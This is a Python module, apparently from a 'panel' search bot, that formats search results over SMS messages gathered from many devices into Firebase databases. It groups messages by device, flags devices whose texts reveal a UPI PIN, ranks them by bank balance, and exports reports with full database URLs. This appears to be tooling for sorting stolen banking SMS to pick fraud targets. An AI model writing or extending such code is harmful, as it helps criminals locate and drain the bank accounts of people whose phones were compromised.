from __future__ import annotations

from collections import defaultdict
from datetime import datetime

from panel_search_bot.firebase_urls import device_id_from_raw_path, firebase_db_label
from panel_search_bot.search_engine import SearchMatch, SearchParams
from panel_search_bot.sms_parser import device_has_upi_pin, message_has_pin
from panel_search_bot.ui import pin_label


def _astik_header_line(params: SearchParams) -> str:
    kw = " & ".join(k.upper().replace(",", " ") for k in params.keywords)
    mode = (
        "ONLINE DEVICES ONLY"
        if params.mode == "online"
        else "OFFLINE CACHE ONLY"
        if params.mode == "offline"
        else "ONLINE + OFFLINE"
    )
    pin = {
        "both": "WITH + WITHOUT PIN",
        "with": "WITH PIN ONLY",
        "without": "WITHOUT PIN ONLY",
    }.get(params.pin_filter, params.pin_filter.upper())
    sort = "BAL HIGH->LOW" if params.balance_sort == "high" else (
        "BAL LOW->HIGH" if params.balance_sort == "low" else "DATE ORDER"
    )
    days = "ALL TIME" if params.days is None else f"LAST {params.days} DAYS"
    return (
        f"SMS SEARCH RESULTS - {kw} - {mode} - PIN: {pin} - {sort} - {days} - "
        "FULL FIREBASE URL"
    )


def format_astik_result_file(
    matches: list[SearchMatch],
    params: SearchParams,
    *,
    elapsed_sec: float,
    dbs_scanned: int,
    dbs_completed: int | None = None,
    stopped_early: bool = False,
) -> str:
    grouped: dict[tuple[str, str], list[SearchMatch]] = defaultdict(list)
    for match in matches:
        device = match.device_id or "unknown"
        grouped[(match.firebase_url, device)].append(match)

    pin_mode = params.pin_filter

    def group_sort_key(item: tuple[tuple[str, str], list[SearchMatch]]):
        _, msgs = item
        best = max((m.balance or 0.0) for m in msgs)
        return (-best, msgs[0].firebase_url, msgs[0].device_id)

    device_groups = sorted(grouped.items(), key=group_sort_key)
    generated = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    done = dbs_completed if dbs_completed is not None else dbs_scanned

    body_lines: list[str] = []
    out_index = 0

    for (_firebase_url, _device_id), msgs in device_groups:
        msgs_sorted = sorted(
            msgs,
            key=lambda m: (m.message_at or datetime.min),
            reverse=True,
        )
        if pin_mode == "with" and not device_has_upi_pin(msgs_sorted):
            continue
        if pin_mode == "without" and device_has_upi_pin(msgs_sorted):
            continue

        if pin_mode == "with":
            msgs_sorted = [m for m in msgs_sorted if m.has_pin or message_has_pin(m.body)]
        elif pin_mode == "without":
            msgs_sorted = [m for m in msgs_sorted if not m.has_pin and not message_has_pin(m.body)]
        if not msgs_sorted:
            continue

        out_index += 1
        firebase_url = _firebase_url
        device_id = _device_id
        db_label = firebase_db_label(firebase_url)
        device_pin = "YES" if device_has_upi_pin(msgs_sorted) else "NO"
        body_lines.append(f"#{out_index}")
        body_lines.append(f"Device ID: {device_id}")
        body_lines.append(f"DB: {db_label}")
        body_lines.append(f"Firebase: {firebase_url}")
        body_lines.append(f"UPI PIN: {device_pin}")
        body_lines.append(f"SMS Count: {len(msgs_sorted)}")
        body_lines.append("-----------------------------------------")
        for msg in msgs_sorted:
            ts = msg.message_at.strftime("%d-%m-%Y %H:%M:%S") if msg.message_at else ""
            head = f"[{msg.sender}]"
            if ts:
                head = f"{ts} {head}"
            body_lines.append(head)
            body_lines.append(msg.body.strip())
            body_lines.append("-----------------------------------------")
        body_lines.append("")

    lines = [
        _astik_header_line(params),
        *(
            ["# PARTIAL EXPORT — /stop se scan yahi tak (poora pool nahi)", ""]
            if stopped_early
            else []
        ),
        f"Generated: {generated}",
        f"Search time: {elapsed_sec:.0f}s",
        f"Total matches: {len(matches)} | Devices: {out_index} | DBs done: {done}/{dbs_scanned}",
        "",
        *body_lines,
    ]

    return "\n".join(lines).rstrip() + "\n"


def match_from_cache_row(url: str, row) -> SearchMatch:
    from panel_search_bot.sms_parser import effective_message_at, parse_balance

    balance = row.balance_value if row.balance_value is not None else parse_balance(row.body)
    msg_at = effective_message_at(row.message_at, row.body)
    device = device_id_from_raw_path(row.raw_path or "")
    if device == "unknown" and row.device_key and not row.device_key.startswith("http"):
        device = row.device_key[:128]
    return SearchMatch(
        firebase_url=url,
        db_label=firebase_db_label(url),
        device_id=device,
        sender=row.sender,
        body=row.body,
        message_at=msg_at,
        balance=balance,
        has_pin=row.has_pin,
        source="cache",
    )


def match_from_live_item(url: str, item: dict) -> SearchMatch:
    from panel_search_bot.sms_parser import effective_message_at

    body = item.get("body", "")
    return SearchMatch(
        firebase_url=url,
        db_label=firebase_db_label(url),
        device_id=str(item.get("device_id") or device_id_from_raw_path(str(item.get("raw_path", "")))),
        sender=item.get("sender", ""),
        body=body,
        message_at=effective_message_at(item.get("message_at"), body),
        balance=item.get("balance"),
        has_pin=item.get("has_pin", False),
        source="live",
    )
